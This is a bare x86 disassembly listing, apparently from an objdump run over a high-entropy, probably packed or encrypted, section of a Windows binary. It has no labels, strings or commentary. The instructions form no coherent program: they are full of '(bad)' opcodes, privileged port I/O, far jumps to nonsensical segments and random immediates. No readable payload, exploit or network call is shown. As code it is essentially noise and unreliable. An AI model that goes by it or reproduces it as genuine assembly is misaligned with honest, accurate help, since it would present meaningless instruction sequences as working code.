  406aad:	adc    eax,0xb10b2426
  406ab2:	enter  0x47ee,0xaf
  406ab6:	dec    esp
  406ab7:	stos   BYTE PTR es:[edi],al
  406ab8:	xor    bh,BYTE PTR [ebx]
  406aba:	mov    bl,0xc5
  406abc:	lock or al,0xd0
  406abf:	sbb    bl,0x12
  406ac2:	xor    eax,0xf6bb6f01
  406ac7:	rcr    DWORD PTR [ebp+0x3d],1
  406aca:	popa   
  406acb:	dec    edi
  406acc:	dec    esi
  406acd:	dec    edx
  406ace:	test   al,0x1c
  406ad0:	mov    esi,edx
  406ad2:	add    al,0xdb
  406ad4:	mov    ds:0xf5ee04ef,eax
  406ad9:	mov    ds:0x53be3e78,al
  406ade:	pushf  
  406adf:	push   esi
  406ae0:	pop    esp
  406ae1:	enter  0xedaa,0xb3
  406ae5:	sbb    ebx,DWORD PTR [esi]
  406ae7:	sbb    BYTE PTR [ebx+0x5cb20311],cl
  406aed:	int    0x2c
  406aef:	int3   
  406af0:	or     bh,bh
  406af2:	lock adc BYTE PTR ds:0x4fb2590b,ch
  406af9:	in     eax,0x8f
  406afb:	scas   al,BYTE PTR es:[edi]
  406afc:	test   DWORD PTR [ebx-0x4f],ebp
  406aff:	mov    edx,0xfa973883
  406b04:	fldz   
  406b06:	push   ds
  406b07:	fild   WORD PTR [edi]
  406b09:	mov    edx,0xc8246f96
  406b0e:	add    esp,DWORD PTR [ebp-0x7d4c9c36]
  406b14:	in     eax,0x23
  406b16:	fnstenv [edi-0x3741fc7a]
  406b1c:	jge    0x406b62
  406b1e:	aad    0x28
  406b20:	lock dec edx
  406b22:	push   0x8a1fdd74
  406b27:	add    dl,bl
  406b29:	lahf   
  406b2a:	push   eax
  406b2b:	dec    edx
  406b2c:	sub    eax,0x593a5e25
  406b31:	mov    eax,eax
  406b33:	jge    0x406b4a
  406b35:	arpl   WORD PTR ds:0x9a36ea19,si
  406b3b:	cmp    BYTE PTR [edx+0x53],al
  406b3e:	cli    
  406b3f:	lock outs dx,BYTE PTR ds:[esi]
  406b41:	jbe    0x406b8e
  406b43:	pop    ecx
  406b44:	rep outs dx,BYTE PTR ds:[esi]
  406b46:	cmp    BYTE PTR [ebx+ebx*1],al
  406b49:	push   ebx
  406b4a:	out    dx,eax
  406b4b:	dec    esp
  406b4c:	dec    ebx
  406b4d:	xor    DWORD PTR [ebp-0x256f4be0],ebx
  406b53:	add    BYTE PTR ss:[esi+0x47],bl
  406b57:	pop    eax
  406b58:	pop    ebx
  406b59:	pop    es
  406b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b5b:	dec    edx
  406b5c:	pop    edx
  406b5d:	fbld   TBYTE PTR [esi-0x691234f7]
  406b63:	ret    0xdd9d
  406b66:	mov    esi,0x35b9d75
  406b6b:	ins    DWORD PTR es:[edi],dx
  406b6c:	cmp    eax,0x446b5c2c
  406b72:	push   esi
  406b73:	lahf   
  406b74:	mov    ch,0x46
  406b76:	cmp    ch,BYTE PTR [edx+0x31da1c14]
  406b7c:	jnp    0x406b55
  406b7e:	mov    al,ds:0xfd06b8ba
  406b83:	leave  
  406b84:	inc    edx
  406b85:	add    edi,DWORD PTR [eax+0x7f]
  406b88:	pop    eax
  406b89:	add    eax,0xdb5ba647
  406b8e:	dec    edx
  406b8f:	sbb    dl,BYTE PTR [edx-0x27149f36]
  406b95:	jp     0x406bb3
  406b97:	fdiv   st(6),st
  406b9a:	fld    DWORD PTR [eax]
  406b9c:	pop    esp
  406b9d:	popa   
  406b9e:	adc    BYTE PTR [ecx+0x2b],al
  406ba1:	mov    ebp,0x928eab99
  406ba6:	imul   esp,DWORD PTR [edx+0x18c26c31],0xd2407506
  406bb0:	xchg   ecx,eax
  406bb1:	jnp    0x406c0f
  406bb3:	int    0x48
  406bb5:	fild   DWORD PTR [ebx-0x26048ad8]
  406bbb:	(bad)  
  406bbc:	mov    ecx,0xb53e9563
  406bc1:	or     BYTE PTR [ecx],ah
  406bc3:	or     edx,0xd0c555f7
  406bc9:	pop    esp
  406bca:	arpl   WORD PTR [ebx],bp
  406bcc:	test   eax,0xdf557139
  406bd1:	jecxz  0x406b98
  406bd3:	gs jmp 0x406bc5
  406bd6:	sub    esi,DWORD PTR [edi+0x34b3f0fb]
  406bdc:	stos   BYTE PTR es:[edi],al
  406bdd:	dec    ebp
  406bde:	scas   eax,DWORD PTR es:[edi]
  406bdf:	daa    
  406be0:	xor    ch,al
  406be2:	test   DWORD PTR [ebx-0x60241027],edi
  406be8:	int3   
  406be9:	rcl    dl,1
  406beb:	xor    eax,0xf4730340
  406bf0:	mov    bh,0xe8
  406bf2:	(bad)  
  406bf3:	adc    al,0x1d
  406bf5:	rcr    DWORD PTR [ebp-0x75],cl
  406bf8:	pop    esi
  406bf9:	mov    esp,0x7a2859a
  406bfe:	mov    ah,0x46
  406c00:	add    ah,bl
  406c02:	dec    ebp
  406c03:	repnz push esi
  406c05:	sub    dl,BYTE PTR [edi]
  406c07:	xor    eax,0x62a8ffea
  406c0c:	nop
  406c0d:	mov    ebx,0xe9911272
  406c12:	sbb    eax,0xc6a95b0f
  406c17:	mov    ch,0xa0
  406c19:	ds xor al,0x1d
  406c1c:	aas    
  406c1d:	sub    eax,DWORD PTR [esi-0x20a9cdf]
  406c23:	jle    0x406bb2
  406c25:	inc    esi
  406c26:	adc    ebp,DWORD PTR [eax-0x5f]
  406c29:	cmp    bh,BYTE PTR [ecx]
  406c2b:	mov    esi,0xfd4c0e4f
  406c30:	stos   BYTE PTR es:[edi],al
  406c31:	xor    DWORD PTR [edi-0x67],esp
  406c34:	pop    ds
  406c35:	jmp    0xfbb3059d
  406c3a:	retf   0x4b93
  406c3d:	mov    esi,0xf6d9600a
  406c42:	shl    DWORD PTR [esi-0x11da33a2],cl
  406c48:	and    eax,0x827c16ec
  406c4d:	sbb    bl,bh
  406c4f:	jge    0x406bfd
  406c51:	lods   al,BYTE PTR ds:[esi]
  406c52:	or     eax,esp
  406c54:	outs   dx,BYTE PTR ds:[esi]
  406c55:	or     esi,DWORD PTR [ebp+0x2f]
  406c58:	pop    esp
  406c59:	sub    eax,0x53195820
  406c5e:	inc    edx
  406c5f:	int3   
  406c60:	(bad)  [esi*1-0x684658b3]
  406c67:	and    al,BYTE PTR [ebx+0x4a47a69]
  406c6d:	jae    0x406cc1
  406c6f:	cmp    ebx,esi
  406c71:	ficomp DWORD PTR [ebx+esi*1-0x49]
  406c75:	cld    
  406c76:	sub    eax,0x3d975c50
  406c7b:	sub    esp,DWORD PTR [edi-0x771c601d]
  406c81:	fdiv   st(4),st
  406c83:	xor    BYTE PTR [edi],al
  406c85:	aam    0xa9
  406c87:	stc    
  406c88:	repz aad 0xd9
  406c8b:	stos   BYTE PTR es:[edi],al
  406c8c:	jbe    0x406c9a
  406c8e:	xor    cl,BYTE PTR [ecx-0x6e46b2f5]
  406c94:	push   0xa30f991
  406c99:	es jg  0x406cd8
  406c9c:	jge    0x406c9a
  406c9e:	aaa    
  406c9f:	imul   edx,DWORD PTR [edx+0x6],0xffffffea
  406ca3:	or     eax,0xe5a403ac
  406ca8:	adc    BYTE PTR [ebx],dh
  406caa:	lods   eax,DWORD PTR ds:[esi]
  406cab:	ret    0x1741
  406cae:	pop    ebp
  406caf:	xchg   edi,eax
  406cb0:	fisubr WORD PTR [edx+0x14]
  406cb3:	ss mov esp,0x6451f3d3
  406cb9:	push   esp
  406cba:	sub    DWORD PTR [ecx],edi
  406cbc:	inc    esi
  406cbd:	fiadd  DWORD PTR [edi+0x597539cb]
  406cc3:	fcomip st,st(5)
  406cc5:	(bad)  
  406cc6:	add    ebp,DWORD PTR [edx]
  406cc8:	inc    edx
  406cc9:	add    BYTE PTR [esi+0xf3c82c9],dh
  406ccf:	and    BYTE PTR [ecx],al
  406cd1:	stos   DWORD PTR es:[edi],eax
  406cd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406cd3:	push   edx
  406cd4:	add    eax,0xefd74942
  406cd9:	ss fucomi st,st(1)
  406cdc:	in     eax,dx
  406cdd:	xor    al,0x5b
  406cdf:	in     eax,dx
  406ce0:	sub    eax,0x7a24a07a
  406ce5:	cmp    DWORD PTR [esi-0x4b61b6ec],esp
  406ceb:	sub    al,0x62
  406ced:	pop    ss
  406cee:	dec    eax
  406cef:	xchg   ebx,eax
  406cf0:	xor    cl,BYTE PTR [edx]
  406cf2:	cmp    ah,bh
  406cf4:	mov    ebp,0xe02bfa16
  406cf9:	jb     0x406cb1
  406cfb:	sbb    DWORD PTR [esi],edx
  406cfd:	mul    DWORD PTR [edi+eiz*4]
  406d00:	(bad)  
  406d01:	jg     0x406d67
  406d03:	push   0x62
  406d05:	and    dh,bl
  406d07:	sahf   
  406d08:	(bad)  
  406d09:	cmp    dl,BYTE PTR ds:0xffbee58
  406d0f:	mov    esi,0xc8da2bcb
  406d14:	add    BYTE PTR [esi],ah
  406d16:	rcr    ecx,cl
  406d18:	xchg   ebx,eax
  406d19:	xchg   esi,eax
  406d1a:	fsubrp st(3),st
  406d1c:	lods   eax,DWORD PTR ds:[esi]
  406d1d:	ds push 0xffffff9a
  406d20:	mov    ebp,0x7c2a2d4f
  406d25:	outs   dx,DWORD PTR ds:[esi]
  406d26:	mov    edi,0x2324558
  406d2b:	pop    eax
  406d2c:	jno    0x406cd7
  406d2e:	mov    edi,DWORD PTR [eax]
  406d30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d31:	jmp    0x2939:0x8afdfd78
  406d38:	mov    esp,0xb90c4266
  406d3d:	test   DWORD PTR [esi],esi
  406d3f:	dec    esi
  406d40:	jb     0x406cfd
  406d42:	xchg   edi,eax
  406d43:	xchg   ebx,eax
  406d44:	sub    al,0x22
  406d46:	in     eax,0x36
  406d48:	dec    edx
  406d49:	sub    bh,dh
  406d4b:	xor    DWORD PTR [edx-0x35],0xd88cf7fb
  406d52:	shr    edx,1
  406d54:	imul   ecx,DWORD PTR [eax],0x72e3ff66
  406d5a:	cwde   
  406d5b:	(bad)  
  406d5c:	(bad)  
  406d5d:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  406d5f:	adc    eax,0xab4c646f
  406d64:	shl    ebx,1
  406d66:	aad    0x8d
  406d68:	loop   0x406d0d
  406d6a:	mov    ecx,0x6b853ccf
  406d6f:	pop    ebx
  406d70:	push   ds
  406d71:	popa   
  406d72:	sar    DWORD PTR [esi+0x6d],1
  406d75:	jp     0x406d2a
  406d77:	outs   dx,DWORD PTR ds:[esi]
  406d78:	sti    
  406d79:	sbb    BYTE PTR [ebx+0x59],ah
  406d7c:	neg    BYTE PTR [ecx]
  406d7e:	xlat   BYTE PTR ds:[ebx]
  406d7f:	mov    cl,0x77
  406d81:	add    BYTE PTR [ebx],al
  406d83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d84:	sub    ch,bh
  406d86:	mov    DWORD PTR [edx+0x17f404a],esp
  406d8c:	ret    0x62a4
  406d8f:	dec    edi
  406d90:	mov    edx,0x3230d5c2
  406d95:	(bad)  
  406d96:	lods   eax,DWORD PTR ds:[esi]
  406d97:	ds cld 
  406d99:	sub    edi,DWORD PTR [ebx+0x31]
  406d9c:	ret    
  406d9d:	sub    BYTE PTR [edi-0x51],dh
  406da0:	neg    DWORD PTR [ebp+0x4a3026aa]
  406da6:	push   0x24
  406da8:	jb     0x406de2
  406daa:	call   0x3cf92df4
  406daf:	sbb    al,0x99
  406db1:	inc    eax
  406db2:	aam    0x7e
  406db4:	inc    eax
  406db5:	neg    BYTE PTR [edx]
  406db7:	pop    eax
  406db8:	xor    BYTE PTR [edi-0x2e1f0a32],bh
  406dbe:	dec    ebx
  406dbf:	into   
  406dc0:	aad    0x34
  406dc2:	fiadd  DWORD PTR [edi-0x54]
  406dc5:	cmp    BYTE PTR [ebx+ebp*8],bl
  406dc8:	xchg   ebx,edx
  406dca:	ds inc ebx
  406dcc:	push   eax
  406dcd:	stos   DWORD PTR es:[edi],eax
  406dce:	push   cs
  406dcf:	lock lds eax,FWORD PTR [edi]
  406dd2:	mov    edx,0x11ba4b42
  406dd7:	lods   al,BYTE PTR ss:[esi]
  406dd9:	addr16 cdq 
  406ddb:	xchg   DWORD PTR [edx],ebx
  406ddd:	jno    0x406e07
  406ddf:	and    ecx,DWORD PTR [eax+0x6e224246]
  406de5:	cli    
  406de6:	mov    ebp,0xe0eee398
  406deb:	hlt    
  406dec:	xor    eax,0xd4044adc
  406df1:	clc    
  406df2:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  406df4:	rcl    DWORD PTR [edx],1
  406df6:	mov    ebp,0x2e6ba08f
  406dfb:	neg    DWORD PTR [ebx]
  406dfd:	pop    eax
  406dfe:	mov    bl,0x3a
  406e00:	jo     0x406de4
  406e02:	repz ret 0x6d1d
  406e06:	jb     0x406e1b
  406e08:	xchg   edx,eax
  406e09:	cmp    DWORD PTR [eax-0x3e],edx
  406e0c:	add    BYTE PTR [esi+0x76],bl
  406e0f:	cdq    
  406e10:	mov    al,0x69
  406e12:	(bad)  
  406e13:	int3   
  406e14:	mov    esi,0xa84cbd60
  406e19:	in     al,dx
  406e1a:	sbb    BYTE PTR [ebx-0x12e6030f],dh
  406e20:	pop    ecx
  406e21:	inc    ebx
  406e22:	dec    edx
  406e23:	shl    DWORD PTR [edi],cl
  406e25:	push   ds
  406e26:	shl    BYTE PTR [edx],1
  406e28:	rcl    DWORD PTR [esi+0x4faf99da],1
  406e2e:	or     eax,0x298b8e31
  406e33:	xor    edx,DWORD PTR [eax-0x7531d791]
  406e39:	push   0xac8f2ffd
  406e3e:	cmp    ebx,DWORD PTR [edx+0x9]
  406e41:	cmc    
  406e42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e43:	adc    DWORD PTR [ebp+ebp*1+0x75],eax
  406e47:	and    DWORD PTR [ebx+0x2e],0x33d0ccbf
  406e4e:	add    esp,DWORD PTR [edi]
  406e50:	pop    es
  406e51:	mov    dl,0xcf
  406e53:	fcmove st,st(2)
  406e55:	xchg   ebp,eax
  406e56:	mov    DWORD PTR [eax+0x76b84629],esi
  406e5c:	in     al,0x5a
  406e5e:	dec    esi
  406e5f:	sub    edi,DWORD PTR [eax-0x22]
  406e62:	inc    esi
  406e63:	and    ebp,DWORD PTR [ecx+ecx*1]
  406e66:	inc    ecx
  406e67:	push   ecx
  406e68:	push   esi
  406e69:	jne    0x406ebb
  406e6b:	pop    ss
  406e6c:	sub    al,0x50
  406e6e:	and    BYTE PTR [ebx+0x7c],dl
  406e71:	xchg   ebx,eax
  406e72:	xor    eax,0x333bf7fb
  406e77:	xor    eax,0x94d583be
  406e7c:	push   eax
  406e7d:	fsubp  st(1),st
  406e7f:	push   0x8d1c33b7
  406e84:	outs   dx,DWORD PTR ds:[esi]
  406e85:	mov    edx,0xdf9deba0
  406e8a:	sbb    al,BYTE PTR [eax+0x44]
  406e8d:	mov    ah,0x86
  406e8f:	dec    ebp
  406e90:	aad    0xb7
  406e92:	cld    
  406e93:	call   0x54fe:0x76be766d
  406e9a:	mov    dl,0xeb
  406e9c:	stos   DWORD PTR es:[edi],eax
  406e9d:	fwait
  406e9e:	stos   DWORD PTR es:[edi],eax
  406e9f:	fdivr  DWORD PTR [esi+0x3e]
  406ea2:	inc    edx
  406ea3:	sub    BYTE PTR [edi+0x1b5da88d],ah
  406ea9:	mov    ebx,0xad539f
  406eae:	outs   dx,DWORD PTR ds:[esi]
  406eaf:	push   ss
  406eb0:	js     0x406eaf
  406eb2:	cmp    edi,0xdf21424a
  406eb8:	dec    ecx
  406eb9:	sub    BYTE PTR [ebx],0xe2
  406ebc:	ror    eax,cl
  406ebe:	jbe    0x406e7d
  406ec0:	and    cl,BYTE PTR [edx+0x74]
  406ec3:	fldenv [eax-0x300d2d00]
  406ec9:	mov    ds:0xffce5544,eax
  406ece:	dec    ebp
  406ecf:	daa    
  406ed0:	xlat   BYTE PTR ds:[ebx]
  406ed1:	xchg   ecx,eax
  406ed2:	or     eax,0xe483aa92
  406ed7:	add    edi,DWORD PTR [ebx]
  406ed9:	ret    0xc5f5
  406edc:	out    0x1d,al
  406ede:	lahf   
  406edf:	icebp  
  406ee0:	sub    al,0x1e
  406ee2:	scas   al,BYTE PTR es:[edi]
  406ee3:	push   ebx
  406ee4:	fisttp DWORD PTR [edx-0x760f6837]
  406eea:	and    eax,DWORD PTR [edi+0x48]
  406eed:	mov    WORD PTR [eax],?
  406eef:	add    al,0xa5
  406ef1:	sub    bl,BYTE PTR [ebx+0x1f]
  406ef4:	seto   al
  406ef7:	call   0x15ce9562
  406efc:	mov    edi,0xd42bd7cd
  406f01:	inc    esp
  406f02:	mov    bl,BYTE PTR [ebp-0x3be1dfc1]
  406f08:	jno    0x406f6b
  406f0a:	rcl    BYTE PTR ds:0x375741f8,cl
  406f10:	outs   dx,DWORD PTR ds:[esi]
  406f11:	sbb    DWORD PTR [edi+0x2c93391b],esi
  406f17:	push   ecx
  406f18:	pop    esp
  406f19:	xor    dh,dh
  406f1b:	psllq  mm0,mm0
  406f1e:	mov    edx,0x4c240d49
  406f23:	adc    bl,bl
  406f25:	mov    fs,WORD PTR [esi]
  406f27:	sbb    ecx,ebp
  406f29:	bswap  esi
  406f2b:	pop    ss
  406f2c:	lods   eax,DWORD PTR ds:[esi]
  406f2d:	cld    
  406f2e:	in     eax,0x13
  406f30:	scas   al,BYTE PTR es:[edi]
  406f31:	xchg   DWORD PTR [edi],ecx
  406f33:	les    ecx,FWORD PTR [edx-0x5e3ef4fa]
  406f39:	sahf   
  406f3a:	jnp    0x406f68
  406f3c:	test   al,0x2b
  406f3e:	push   edi
  406f3f:	mov    dh,0x67
  406f41:	mov    esp,0x23b399b0
  406f46:	mov    dh,0x3
  406f48:	mov    ah,0x99
  406f4a:	loop   0x406f59
  406f4c:	xor    ebp,DWORD PTR [edx-0x10]
  406f4f:	lods   al,BYTE PTR ds:[esi]
  406f50:	inc    edx
  406f51:	in     al,0x36
  406f53:	test   al,0x10
  406f55:	mov    dh,0x2f
  406f57:	test   eax,0x75879d09
  406f5d:	lds    eax,FWORD PTR [edi-0x7f]
  406f60:	retf   0x358b
  406f63:	ror    BYTE PTR [ebp+0x17],cl
  406f66:	out    0x9b,al
  406f68:	xlat   BYTE PTR ds:[ebx]
  406f69:	sbb    eax,0x1263a7f7
  406f6e:	pop    es
  406f6f:	mov    bl,0xbd
  406f71:	sti    
  406f72:	inc    esp
  406f73:	repnz cmp eax,DWORD PTR [esi+edi*4-0x7100fb86]
  406f7b:	mov    bl,0x79
  406f7d:	outs   dx,DWORD PTR ds:[esi]
  406f7e:	punpckhdq mm0,QWORD PTR [edi-0x4e]
  406f82:	pusha  
  406f83:	pop    esi
  406f84:	inc    ebx
  406f85:	rcr    cl,0x3b
  406f88:	push   ecx
  406f89:	jmp    0x406feb
  406f8b:	dec    ebp
  406f8c:	aas    
  406f8d:	adc    eax,DWORD PTR [edx]
  406f8f:	xlat   BYTE PTR ds:[ebx]
  406f90:	inc    ebx
  406f91:	sub    ax,0xbf93
  406f95:	jne    0x407007
  406f97:	pop    es
  406f98:	les    ecx,FWORD PTR [ebx-0x47]
  406f9b:	cmp    al,0x7e
  406f9d:	push   eax
  406f9e:	lods   al,BYTE PTR ds:[esi]
  406f9f:	int3   
  406fa0:	(bad)  
  406fa1:	cs jae 0x407012
  406fa4:	dec    ecx
  406fa5:	push   ecx
  406fa6:	push   es
  406fa7:	fisub  DWORD PTR [esi-0x10e34cd7]
  406fad:	xchg   ebx,eax
  406fae:	xor    al,0xd5
  406fb0:	sub    al,0xdc
  406fb2:	xchg   ebx,eax
  406fb3:	sbb    esi,ecx
  406fb5:	gs dec esp
  406fb7:	jle    0x406f7e
  406fb9:	xor    eax,0x29bac502
  406fbe:	push   edi
  406fbf:	jbe    0x406fa5
  406fc1:	inc    ecx
  406fc2:	inc    ebp
  406fc3:	shr    DWORD PTR ds:0x174888a1,0xff
  406fca:	and    DWORD PTR [edx+0x19],esp
  406fcd:	lea    ebp,[ecx-0x27]
  406fd0:	ja     0x406fb7
  406fd2:	mov    bl,0xd
  406fd4:	jl     0x406f8d
  406fd6:	add    dl,BYTE PTR [ecx]
  406fd8:	clc    
  406fd9:	dec    esp
  406fda:	mov    edi,0x7eef875
  406fdf:	mov    ah,ch
  406fe1:	add    BYTE PTR [edx],0x46
  406fe4:	test   al,0x52
  406fe6:	cmp    DWORD PTR [edi+0x133f0ffa],edx
  406fec:	mov    al,ds:0x337ab9d4
  406ff1:	cmp    bh,BYTE PTR [esi]
  406ff3:	push   ecx
  406ff4:	rcl    BYTE PTR [ecx+0x1813337b],cl
  406ffa:	imul   ebp,DWORD PTR [edx],0x3b
  406ffd:	sub    eax,esp
  406fff:	enter  0xf372,0xd0
  407003:	ja     0x407007
  407005:	hlt    
  407006:	mov    BYTE PTR [ebx-0x5d134bcf],cl
  40700c:	scas   eax,DWORD PTR es:[edi]
  40700d:	or     ah,dl
  40700f:	ins    DWORD PTR es:[edi],dx
  407010:	jle    0x407017
  407012:	or     al,0xa
  407014:	mov    edx,0x7882acdb
  407019:	and    al,0x9c
  40701b:	xchg   ecx,eax
  40701c:	aam    0x85
  40701e:	push   cs
  40701f:	jb     0x406fd9
  407021:	sar    DWORD PTR [edx+0x3809e175],cl
  407027:	adc    eax,0x3630cb1a
  40702c:	dec    eax
  40702d:	add    eax,0x65ebf259
  407032:	(bad)  
  407033:	and    edi,ebx
  407035:	cmc    
  407036:	mov    eax,ds:0x8ac3440d
  40703b:	div    eax
  40703d:	or     ah,BYTE PTR [esi+0x67dde84f]
  407043:	push   cs
  407044:	cmp    dl,0xf6
  407047:	xor    DWORD PTR [edx+esi*4+0x312a1f1c],esp
  40704e:	mov    eax,ds:0x97f80211
  407053:	cs stos DWORD PTR es:[edi],eax
  407055:	cld    
  407056:	stos   BYTE PTR es:[edi],al
  407057:	mov    BYTE PTR es:[edi+0x53],bl
  40705b:	xchg   al,al
  40705d:	into   
  40705e:	addr16 adc eax,0xdcb9bdf1
  407064:	jno    0x40704b
  407066:	push   es
  407067:	pop    ebp
  407068:	and    edx,DWORD PTR [ebp+edx*2-0x19]
  40706c:	dec    ebp
  40706d:	add    DWORD PTR cs:[esi-0x18],eax
  407071:	data16 scas al,BYTE PTR es:[edi]
  407073:	cdq    
  407074:	lods   eax,DWORD PTR ds:[esi]
  407075:	xchg   DWORD PTR [ebx],esp
  407077:	mov    bl,0x9
  407079:	xchg   ebp,eax
  40707a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40707b:	loop   0x40706a
  40707d:	out    dx,eax
  40707e:	imul   ecx,DWORD PTR [esi],0x50026605
  407084:	jo     0x4070f2
  407086:	push   esp
  407087:	arpl   WORD PTR [eax-0x20ed40fe],si
  40708d:	js     0x4070d1
  40708f:	sbb    DWORD PTR [esi],ebp
  407091:	pop    ss
  407092:	pop    edx
  407093:	(bad)
  407096:	(bad)
  40709a:	jo     0x407112
  40709c:	cmc    
  40709d:	mov    bl,0xf8
  40709f:	jecxz  0x407082
  4070a1:	dec    eax
  4070a2:	ret    
  4070a3:	loop   0x40709e
  4070a5:	pop    edi
  4070a6:	ret    0xae79
  4070a9:	sub    ebp,eax
  4070ab:	and    ecx,DWORD PTR [ebx]
  4070ad:	loope  0x407115
  4070af:	rol    BYTE PTR [eax-0x33],cl
  4070b2:	cs dec edi
  4070b4:	repnz test BYTE PTR [edi-0x588a98d8],ah
  4070bb:	and    ebx,DWORD PTR [edi-0x1f933c6f]
  4070c1:	adc    eax,0xefd64b5c
  4070c6:	mov    dh,0x7
  4070c8:	xchg   esi,eax
  4070c9:	cwde   
  4070ca:	push   ss
  4070cb:	outs   dx,BYTE PTR ds:[esi]
  4070cc:	push   ecx
  4070cd:	jo     0x4070f2
  4070cf:	jmp    0x210:0xa5ed3a0c
  4070d6:	xor    ah,BYTE PTR [eax]
  4070d8:	inc    ebx
  4070d9:	push   eax
  4070da:	call   0x310f960
  4070df:	cmp    ch,BYTE PTR [ecx-0x42]
  4070e2:	push   esi
  4070e3:	mov    edx,DWORD PTR [edi-0x38f11523]
  4070e9:	clc    
  4070ea:	je     0x4070e9
  4070ec:	sbb    eax,0x13213989
  4070f1:	add    eax,0xd6a3cb9d
  4070f6:	mov    ebp,0x6b1b921
  4070fb:	dec    eax
  4070fc:	(bad)  
  4070fd:	jecxz  0x407111
  4070ff:	dec    ebp
  407100:	icebp  
  407101:	jo     0x407109
  407103:	mov    edi,0xb8978254
  407108:	test   ecx,ecx
  40710a:	out    dx,eax
  40710b:	cld    
  40710c:	scas   eax,DWORD PTR es:[edi]
  40710d:	sahf   
  40710e:	add    ch,BYTE PTR [eax+0xb]
  407111:	jbe    0x407182
  407113:	jecxz  0x40718b
  407115:	inc    edx
  407116:	jg     0x407135
  407118:	mov    bl,0xa5
  40711a:	cmp    BYTE PTR [edx-0x243a2f90],ch
  407120:	mov    edi,0x6658e8c9
  407125:	arpl   WORD PTR [eax-0x3b319297],si
  40712b:	pop    ebp
  40712c:	add    al,0x35
  40712e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40712f:	lahf   
  407130:	add    al,BYTE PTR [ebp-0x7d]
  407133:	cmp    eax,0xdd25abd5
  407138:	stos   BYTE PTR es:[edi],al
  407139:	pop    ds
  40713a:	dec    esi
  40713b:	(bad)
  40713e:	pop    edi
  40713f:	retf   0x8403
  407142:	(bad)  
  407143:	imul   BYTE PTR [eax+0x40]
  407146:	inc    edi
  407147:	push   ebx
  407148:	xor    esi,ebx
  40714a:	scas   eax,DWORD PTR es:[edi]
  40714b:	sbb    esi,edi
  40714d:	add    ch,BYTE PTR [edi]
  40714f:	pusha  
  407150:	ds add al,0xd6
  407153:	ds loopne 0x4071cf
  407156:	sbb    al,0xef
  407158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407159:	int3   
  40715a:	sub    dl,ah
  40715c:	aaa    
  40715d:	xlat   BYTE PTR ds:[ebx]
  40715e:	outs   dx,BYTE PTR ds:[esi]
  40715f:	js     0x407192
  407161:	push   ds
  407162:	cld    
  407163:	xor    BYTE PTR [eax+ebx*1-0x15],dl
  407167:	jle    0x40715b
  407169:	test   eax,0xbc80cc82
  40716e:	lahf   
  40716f:	mov    ch,0xcf
  407171:	mov    ebx,0xc71b6972
  407176:	or     BYTE PTR [eax+edx*8+0x7904af2f],dh
  40717d:	xor    bh,BYTE PTR ds:0xd5e45825
  407183:	mov    ecx,0xb18040a9
  407188:	or     DWORD PTR [esp+eiz*8+0x7f],ebx
  40718c:	sbb    esp,DWORD PTR [ecx+ecx*1-0x65]
  407190:	cmp    eax,0x5b898865
  407195:	outs   dx,DWORD PTR ds:[esi]
  407196:	jne    0x40711b
  407198:	loop   0x4071ad
  40719a:	cld    
  40719b:	add    ch,BYTE PTR [ebx+0x3b]
  40719e:	ret    0x393a
  4071a1:	clc    
  4071a2:	jmp    0x4071be
  4071a4:	xor    BYTE PTR [eax-0x25b31c32],bl
  4071aa:	aad    0x81
  4071ac:	adc    al,0x98
  4071ae:	lock cdq 
  4071b0:	jp     0x40719a
  4071b2:	pop    ss
  4071b3:	push   ecx
  4071b4:	pop    ds
  4071b5:	and    eax,0xb5d8a983
  4071ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4071bb:	xchg   ebp,eax
  4071bc:	cs dec esi
  4071be:	push   cs
  4071bf:	jno    0x40714b
  4071c1:	or     edx,DWORD PTR [eax+0xf]
  4071c4:	call   0xf6f4e23d
  4071c9:	outs   dx,BYTE PTR ds:[esi]
  4071ca:	sahf   
  4071cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071cc:	jno    0x4071aa
  4071ce:	cmc    
  4071cf:	push   es
  4071d0:	mov    edi,0x5f1f2e7e
  4071d5:	iret   
  4071d6:	cmc    
  4071d7:	imul   ecx,DWORD PTR [edi+0x39c6beae],0x551a86db
  4071e1:	das    
  4071e2:	in     al,0xd7
  4071e4:	push   ebp
  4071e5:	shl    edx,0x1e
  4071e8:	stos   BYTE PTR es:[edi],al
  4071e9:	push   edx
  4071ea:	inc    ebp
  4071eb:	jecxz  0x40723e
  4071ed:	(bad)  
  4071ee:	cmp    BYTE PTR [esi-0xc0f5071],ah
  4071f4:	pop    ss
  4071f5:	and    bl,BYTE PTR [edx]
  4071f7:	push   0xae076b67
  4071fc:	pop    ebx
  4071fd:	xor    cl,al
  4071ff:	mov    edx,0xb71315b7
  407204:	add    DWORD PTR [ecx+0x7bf97693],ebp
  40720a:	(bad)  
  40720b:	jnp    0x407225
  40720d:	loop   0x407220
  40720f:	xchg   ebx,eax
  407210:	pop    esi
  407211:	or     eax,0x4898ff41
  407216:	xor    eax,DWORD PTR [edx-0x482a471e]
  40721c:	jae    0x4071b9
  40721e:	out    0x80,al
  407220:	or     BYTE PTR [eax+ebx*1],al
  407223:	mov    ds,ebx
  407225:	push   eax
  407226:	loop   0x40727b
  407228:	shl    BYTE PTR [eax-0x6e],0x82
  40722c:	inc    ecx
  40722d:	pop    eax
  40722e:	test   eax,0x9929a343
  407233:	xchg   ebp,eax
  407234:	(bad)  
  407235:	cmp    cl,BYTE PTR [ecx+0x3]
  407238:	mov    esp,0xcb477446
  40723d:	xor    eax,0x81f463a0
  407242:	xor    ch,BYTE PTR [ebx]
  407244:	mov    ch,0x42
  407246:	cmp    esi,DWORD PTR [eax+0x563f6b0c]
  40724c:	(bad)  
  40724d:	in     eax,0x49
  40724f:	cmp    esi,DWORD PTR [ecx+0x3fc43e34]
  407255:	add    al,ch
  407257:	aas    
  407258:	dec    ebx
  407259:	mov    esi,0xb1817afb
  40725e:	xor    eax,0xa490511a
  407263:	inc    ebp
